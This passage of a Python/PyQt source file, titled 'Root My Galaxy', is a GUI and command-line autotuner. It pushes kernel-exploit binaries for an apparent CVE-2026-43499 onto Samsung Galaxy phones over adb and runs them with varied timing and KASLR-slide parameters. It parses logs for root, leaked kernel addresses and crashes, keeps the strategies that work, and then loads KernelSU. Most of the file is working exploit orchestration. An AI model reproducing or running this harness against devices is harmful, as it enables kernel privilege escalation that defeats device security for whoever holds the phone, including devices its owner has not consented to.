        if self.kill_system_apps.isChecked() or self.kill_user_apps.isChecked():
            cleanup_script += (
                "user=$(cmd activity get-current-user); "
                "dumpsys activity processes | "
                f"{package_filter} | "
                "sort -u | while read -r app; do "
                "[ -n \"$app\" ] && am force-stop --user \"$user\" \"$app\"; "
                "done; "
            )
        cleanup_script += (
            "rm -f /data/local/tmp/exploit.log "
            "/data/local/tmp/libcve43499root "
            "/data/local/tmp/cve-2026-43499-app.so "
            "/data/local/tmp/ksud-selected"
        )
        self.cleanup_process.start("adb", [
            "-s", str(serial), "shell", "sh", "-c",
            cleanup_script,
        ])

    def start_script(self, _exit_code: int = 0,
                     _exit_status: QProcess.ExitStatus | None = None) -> None:
        if self.cleanup_process:
            self.cleanup_process.deleteLater()
            self.cleanup_process = None
        self.elapsed.start()
        self.run_timer.start(1000)
        self.active_time_label.setText("Device uptime · 00:00:00")
        self.process = QProcess(self)
        env = QProcessEnvironment.systemEnvironment()
        env.insert("MAX_ATTEMPTS", "5")
        env.insert("HELPER", self.helper_path)
        env.insert("PAYLOAD", self.payload_path)
        env.insert("KSUD", self.ksud_path)
        self.process.setProcessEnvironment(env)
        self.process.setProcessChannelMode(QProcess.ProcessChannelMode.SeparateChannels)
        self.process.readyReadStandardOutput.connect(self.read_stdout)
        self.process.readyReadStandardError.connect(self.read_stderr)
        self.process.finished.connect(self.finished)
        self.process.errorOccurred.connect(self.process_error)
        shell_script = self.build_root_script(self.selected_serial)
        if shutil.which("stdbuf"):
            self.process.start("stdbuf", ["-oL", "-eL", "bash", "-lc", shell_script])
        else:
            self.process.start("bash", ["-lc", shell_script])
        self.start_remote_log_stream()
        self.start_button.setEnabled(False)
        self.stop_button.setEnabled(True)
        self.refresh_button.setEnabled(False)
        self.status.setText("Running…")

    def cleanup_error(self, _error: QProcess.ProcessError) -> None:
        message = self.cleanup_process.errorString() if self.cleanup_process else "unknown error"
        self.append_output(f"[GUI] Cleanup failed: {message}")
        if self.cleanup_process:
            self.cleanup_process.deleteLater()
            self.cleanup_process = None
        self.start_button.setEnabled(True)
        self.refresh_button.setEnabled(True)
        self.status.setText("Cleanup failed")
        self.restore_screen_state()

    def restore_screen_state(self) -> None:
        if not self.selected_serial or self.restore_process is not None:
            return
        self.restore_process = QProcess(self)
        self.restore_process.finished.connect(self.screen_restore_finished)
        self.restore_process.errorOccurred.connect(self.screen_restore_error)
        self.restore_process.start(
            "adb", ["-s", self.selected_serial, "shell", "svc", "power", "stayon", "false"]
        )

    def screen_restore_finished(self, _exit_code: int, _status: QProcess.ExitStatus) -> None:
        if self.restore_process:
            self.restore_process.deleteLater()
            self.restore_process = None

    def screen_restore_error(self, _error: QProcess.ProcessError) -> None:
        if self.restore_process:
            self.restore_process.deleteLater()
            self.restore_process = None

    def read_stdout(self) -> None:
        if self.process:
            self._drain_channel(self.process.readAllStandardOutput())

    def read_stderr(self) -> None:
        if self.process:
            self._drain_channel(self.process.readAllStandardError())

    def _drain_channel(self, payload: bytes) -> None:
        data = bytes(payload).decode(errors="replace")
        if not data:
            return
        for line in data.splitlines():
            if line.strip():
                self.append_output(line)

    def start_remote_log_stream(self) -> None:
        if not self.selected_serial or self.log_process is not None:
            return
        self.log_started = True
        self.log_process = QProcess(self)
        self.log_process.setProcessChannelMode(QProcess.ProcessChannelMode.SeparateChannels)
        self.log_process.readyReadStandardOutput.connect(self.remote_log_ready)
        self.log_process.errorOccurred.connect(self.remote_log_error)
        self.log_process.start(
            "adb",
            ["-s", self.selected_serial, "shell", "sh", "-c",
             "while [ ! -e /data/local/tmp/exploit.log ]; do sleep 1; done; "
             "line=0; while [ -e /data/local/tmp/exploit.log ]; do "
             "count=$(wc -l < /data/local/tmp/exploit.log); "
             "if [ $count -lt $line ]; then line=0; fi; "
             "if [ $count -gt $line ]; then "
             "tail -n +$((line + 1)) /data/local/tmp/exploit.log; line=$count; fi; "
             "sleep 1; done"]
        )

    def stop_remote_log_stream(self) -> None:
        if self.log_process:
            self.log_process.kill()
            self.log_process.deleteLater()
            self.log_process = None

    def remote_log_ready(self) -> None:
        if not self.log_process:
            return
        content = bytes(self.log_process.readAllStandardOutput()).decode(errors="replace")
        if content:
            self._drain_remote_log(content)

    def _drain_remote_log(self, content: str) -> None:
        content = ANSI_ESCAPE.sub("", content).replace("\r", "")
        for line in content.splitlines():
            if line.strip():
                self.append_output(line)

    def remote_log_error(self, _error: QProcess.ProcessError) -> None:
        self.stop_remote_log_stream()

    def show_remote_log_tail(self) -> None:
        if not self.selected_serial:
            return
        try:
            result = subprocess.run(
                [
                    "adb", "-s", self.selected_serial, "shell", "tail", "-n", "120",
                    "/data/local/tmp/exploit.log",
                ],
                text=True, capture_output=True, timeout=5, check=False,
            )
        except (OSError, subprocess.TimeoutExpired):
            return
        tail = result.stdout.strip()
        if not tail:
            return
        for line in tail.splitlines():
            if line.strip():
                self.append_output(line)

    def append_output(self, text: str) -> None:
        # Helpers may emit ANSI colours; they become visible as broken escape
        # characters in a text widget, so strip them before rendering.
        text = ANSI_ESCAPE.sub("", text).replace("\r", "")
        if text.strip():
            self.adaptive_log_lines.append(text.strip())
            self.update_adaptive_live_status(text.strip())
        hidden_lines = (
            "$ python-root-flow",
            "[*] Device:",
            "[runner-live]",
            "following path=",
        )
        if any(marker.lower() in text.lower() for marker in hidden_lines):
            return
        text = self.translate_log(text)
        if text.startswith("[GUI]"):
            text = text.replace("[GUI]", "[+]", 1)
        if self.is_root_active(text):
            self.set_root_active()
        quiet_match = re.search(r"waiting for boot allocator quiet window seconds=(\d+)", text,
                                flags=re.IGNORECASE)
        if quiet_match:
            self.log_started = True
            self.quiet_duration = int(quiet_match.group(1))
            self.quiet_deadline = time.monotonic() + self.quiet_duration
            self.quiet_progress.setRange(0, self.quiet_duration)
            self.quiet_progress.setValue(0)
            self.quiet_progress.show()
        transfer_markers = (
            "staging", "staged", "adb push", "pushing", "sending",
            "file pushed", "file pulled", " skipped", " mb/s",
        )
        if any(marker in text.lower() for marker in transfer_markers):
            return
        color = "#dc2626" if "[!]" in text or "failed" in text.lower() else \
            "#16a34a" if "[+]" in text or "root acquired" in text.lower() or "success" in text.lower() else \
            "#fffaf3"
        self.output.append(f'<span style="color:{color}">{escape(text)}</span>')
        self.output.verticalScrollBar().setValue(self.output.verticalScrollBar().maximum())

    @staticmethod
    def translate_log(text: str) -> str:
        translations = {
            "Staging from Termux files": "Preparing exploit files",
            "Staging selected helper / payload / ksud from local assets": "Preparing exploit files",
        }
        for source, target in translations.items():
            text = text.replace(source, target)
        return text

    @staticmethod
    def is_root_active(text: str) -> bool:
        lowered = text.lower()
        return "uid=0" in lowered or "root complete" in lowered or "full root" in lowered

    def set_root_active(self) -> None:
        self.root_active = True
        self.title_label.setText("Root My Galaxy")
        self.root_check.show()
        self.quiet_progress.hide()
        self.start_button.setEnabled(False)
        self.stop_button.setEnabled(False)
        self.status.setText("Root active")
        self.status.setStyleSheet("color: #16a34a; font-weight: 700")

    def update_elapsed_status(self) -> None:
        if self.process and self.process.state() != QProcess.ProcessState.NotRunning:
            self.update_active_time()
            if self.quiet_deadline is not None:
                remaining = max(0, int(self.quiet_deadline - time.monotonic() + 0.999))
                self.status.setText(f"Quiet window · {remaining}s")
                self.quiet_progress.setValue(self.quiet_duration - remaining)
                if remaining == 0:
                    self.quiet_deadline = None
                    self.quiet_progress.hide()
            else:
                self.status.setText(f"Running · {self.elapsed.elapsed() // 1000}s")

    def update_active_time(self) -> None:
        self.update_device_uptime()

    def update_device_uptime(self) -> None:
        if not self.selected_serial:
            self.active_time_label.hide()
            return
        self.request_device_time()
        if self.device_uptime_seconds is None:
            return
        total = self.device_uptime_seconds
        days, remainder = divmod(total, 86400)
        hours, remainder = divmod(remainder, 3600)
        minutes, seconds = divmod(remainder, 60)
        prefix = f"{days}d " if days else ""
        self.active_time_label.setText(
            f"Device uptime · {prefix}{hours:02d}:{minutes:02d}:{seconds:02d}"
        )

    def request_device_time(self) -> None:
        if not self.selected_serial or self.device_clock_process is not None:
            return
        self.device_clock_process = QProcess(self)
        self.device_clock_process.finished.connect(self.device_time_finished)
        self.device_clock_process.errorOccurred.connect(self.device_time_error)
        self.device_clock_process.start(
            "adb", ["-s", self.selected_serial, "shell", "cat", "/proc/uptime"]
        )

    def device_time_finished(self, _exit_code: int, _status: QProcess.ExitStatus) -> None:
        if not self.device_clock_process:
            return
        raw = bytes(self.device_clock_process.readAllStandardOutput()).decode().strip()
        try:
            uptime = int(float(raw.split()[0]))
        except (ValueError, IndexError):
            uptime = None
        if uptime is not None:
            self.device_uptime_seconds = uptime
        self.device_clock_process.deleteLater()
        self.device_clock_process = None

    def device_time_error(self, _error: QProcess.ProcessError) -> None:
        if self.device_clock_process:
            self.device_clock_process.deleteLater()
            self.device_clock_process = None

    def stop(self) -> None:
        if self.process and self.process.state() != QProcess.ProcessState.NotRunning:
            self.append_output("\n[GUI] Stopping process…")
            self.process.terminate()
            QTimer.singleShot(2000, self.kill_if_running)
        self.stop_remote_log_stream()

    def kill_if_running(self) -> None:
        if self.process and self.process.state() != QProcess.ProcessState.NotRunning:
            self.process.kill()

    def process_error(self, _error: QProcess.ProcessError) -> None:
        self.append_output(f"[GUI] Process error: {self.process.errorString() if self.process else 'unknown'}")

    def finished(self, exit_code: int, _exit_status: QProcess.ExitStatus) -> None:
        self.read_stdout()
        self.read_stderr()
        self._learn_from_run()
        self.update_adaptive_dashboard()
        self.update_active_time()
        self.run_timer.stop()
        self.quiet_deadline = None
        self.quiet_progress.hide()
        self.stop_remote_log_stream()
        self.start_button.setEnabled(not self.root_active)
        self.stop_button.setEnabled(False)
        self.refresh_button.setEnabled(True)
        if self.root_active:
            self.status.setText("Root active")
            self.status.setStyleSheet("color: #16a34a; font-weight: 700")
            self.show_remote_log_tail()
        elif exit_code == 0:
            self.status.setText("Completed successfully")
            self.status.setStyleSheet("color: #16a34a; font-weight: 600")
        else:
            self.status.setText(f"Finished with exit code {exit_code}")
            self.status.setStyleSheet("color: #dc2626; font-weight: 600")
        self.process = None
        self.restore_screen_state()

    def closeEvent(self, event) -> None:
        self.stop_remote_log_stream()
        if self.process and self.process.state() != QProcess.ProcessState.NotRunning:
            self.process.kill()
            self.process.waitForFinished(2000)
            self.process.deleteLater()
            self.process = None
        for proc_name in ("cleanup_process", "restore_process", "device_clock_process", "reboot_process"):
            proc = getattr(self, proc_name, None)
            if proc:
                proc.kill()
                proc.waitForFinished(1000)
                proc.deleteLater()
                setattr(self, proc_name, None)
        event.accept()


def run_autotune(serial: str, cycles: int, allow_reboot: bool) -> int:
    base = Path(__file__).resolve().parent
    assets = base / "assets"
    state_path = base / ".root-my-galaxy-state.json"
    try:
        state = json.loads(state_path.read_text())
    except (OSError, ValueError):
        state = {"version": 1, "profiles": {}}

    def adb(*arguments: str, timeout: int = 30) -> subprocess.CompletedProcess[str]:
        return subprocess.run(
            ["adb", "-s", serial, *arguments], text=True,
            capture_output=True, timeout=timeout, check=False,
        )

    def wait_for_boot() -> tuple[str, str]:
        subprocess.run(["adb", "-s", serial, "wait-for-device"],
                       timeout=120, check=False)
        result = adb(
            "shell", "sh", "-c",
            "while [ \"$(getprop sys.boot_completed)\" != 1 ]; do sleep 1; done; "
            "getprop ro.build.display.id; cat /proc/sys/kernel/random/boot_id",
            timeout=180,
        )
        values = [line.strip() for line in result.stdout.splitlines() if line.strip()]
        return (values[0] if values else "unknown",
                values[1] if len(values) > 1 else "")

    if cycles > 1 and not allow_reboot:
        print("[!] Multiple clean autotune cycles require --allow-reboot.")
        return 2

    defaults = [25000, 15000, 20000, 30000, 50000]
    advances = [0, 1, 2, 3]
    build, boot_id = wait_for_boot()
    profiles = state.setdefault("profiles", {})
    profile = profiles.setdefault(build, {"delays": {}, "boots": {}, "strategies": {}})
    strategies = profile.setdefault("strategies", {})

    def strategy_score(item: tuple[int, int]) -> tuple[int, int, int, int]:
        delay, advance = item
        stats = strategies.get(f"{delay}:{advance}", {})
        delay_history = profile.setdefault("delays", {}).get(str(delay), {})
        return (
            -int(stats.get("root_success", 0)) - int(delay_history.get("root_success", 0)),
            -int(stats.get("scheduler_success", 0)) - int(delay_history.get("scheduler_success", 0)),
            int(stats.get("crashes", 0)),
            int(stats.get("runs", 0)),
        )

    candidates = [(delay, advance) for delay in defaults for advance in advances]
    attempted: set[tuple[int, int]] = set()

    for cycle in range(cycles):
        if cycle and allow_reboot:
            print(f"[*] Rebooting before clean cycle {cycle + 1}/{cycles}")
            adb("reboot")
            build, boot_id = wait_for_boot()

        available = [candidate for candidate in candidates if candidate not in attempted]
        delay, advance = sorted(available or candidates, key=strategy_score)[0]
        attempted.add((delay, advance))
        key = f"{delay}:{advance}"
        stats = strategies.setdefault(key, {
            "runs": 0, "scheduler_success": 0,
            "root_success": 0, "crashes": 0,
        })
        boot = profile.setdefault("boots", {}).setdefault(boot_id, {})
        slide = str(boot.get("slide", ""))
        slide_env = f" SLIDE_P0_OFFSET={slide}" if re.fullmatch(
            r"0x[0-9a-fA-F]+", slide) else ""

        print(f"[*] Cycle {cycle + 1}/{cycles}: delay={delay} advance={advance}")
        for source, remote in (
            (assets / "libcve43499root.so", "/data/local/tmp/ksu-helper"),
            (assets / "cve-2026-43499-app-lab-afzg1.so", "/data/local/tmp/ksu-payload"),
            (assets / "ksud-next", "/data/local/tmp/ksud-selected"),
        ):
            pushed = adb("push", str(source), remote, timeout=60)
            if pushed.returncode:
                print(pushed.stderr.strip())
                return 1
        adb("shell", "chmod", "0755", "/data/local/tmp/ksu-helper",
            "/data/local/tmp/ksu-payload", "/data/local/tmp/ksud-selected")

        command = (
            ": > /data/local/tmp/exploit.log; "
            f"EXPLOIT_ATTEMPTS=1 EXPLOIT_DELAY_SEQUENCE_USEC={delay} "
            f"SIGRETURN_ADVANCE={advance}{slide_env} "
            "/data/local/tmp/ksu-helper --run-payload "
            "/data/local/tmp/ksu-payload /data/local/tmp/ksu-helper "
            "/data/local/tmp/exploit.log"
        )
        try:
            result = adb("shell", "sh", "-c", command, timeout=240)
            log = adb("shell", "cat", "/data/local/tmp/exploit.log",
                      timeout=10).stdout
        except subprocess.TimeoutExpired:
            result = None
            log = ""
        if log:
            print(log, end="" if log.endswith("\n") else "\n")

        stats["runs"] = int(stats.get("runs", 0)) + 1
        scheduler_ok = bool(re.search(
            r"sigreturn full mode done calls=\d+ success=[1-9]", log))
        rooted = "stage=temporary-root-ready" in log
        if scheduler_ok:
            stats["scheduler_success"] = int(stats.get("scheduler_success", 0)) + 1
        if rooted:
            stats["root_success"] = int(stats.get("root_success", 0)) + 1

        slide_match = re.search(r"slide-kaslr-ok .*p0_offset=([0-9a-fA-F]+)", log)
        if slide_match:
            boot["slide"] = f"0x{slide_match.group(1).lower()}"
        route = re.search(
            r"stage=entering-main-route base=([0-9a-fA-F]+) "
            r"lock=([0-9a-fA-F]+) fops=([0-9a-fA-F]+)", log)
        boot["last_addresses"] = dict(zip(
            ("page", "lock", "fops"), route.groups())) if route else {}
        boot["updated_at"] = int(time.time())

        device_online = adb("get-state", timeout=10).stdout.strip() == "device"
        if not device_online:
            stats["crashes"] = int(stats.get("crashes", 0)) + 1
            print(f"[!] Strategy {key} disconnected the device; quarantined.")

        state_path.write_text(json.dumps(state, indent=2, sort_keys=True) + "\n")
        if rooted:
            late = adb(
                "shell", "sh", "-c",
                "S25U_KSUD_PATH=/data/local/tmp/ksud-selected "
                "/data/local/tmp/ksu-helper --late-load", timeout=60)
            print(late.stdout, end="")
            print(f"[+] Root strategy selected: delay={delay} advance={advance}")
            return 0
        if not device_online and not allow_reboot:
            return 1
        time.sleep(5)

    print("[!] Autotune finished without full root; learned state was preserved.")
    return 1


def main() -> int:
    parser = argparse.ArgumentParser(add_help=False)
    parser.add_argument("--autotune", action="store_true")
    parser.add_argument("--serial")
    parser.add_argument("--cycles", type=int, default=10)
    parser.add_argument("--allow-reboot", action="store_true")
    args, qt_args = parser.parse_known_args()
    if args.autotune:
        if not args.serial:
            print("[!] --serial is required for autotune.")
            return 2
        return run_autotune(args.serial, max(1, args.cycles), args.allow_reboot)

    app = QApplication([sys.argv[0], *qt_args])
    app.setApplicationName("Standalone Exploit Root GUI")
    if "Breeze" in QStyleFactory.keys():
        app.setStyle(QStyleFactory.create("Breeze"))
    window = RootWindow()
    window.show()
    return app.exec()


if __name__ == "__main__":
    raise SystemExit(main())
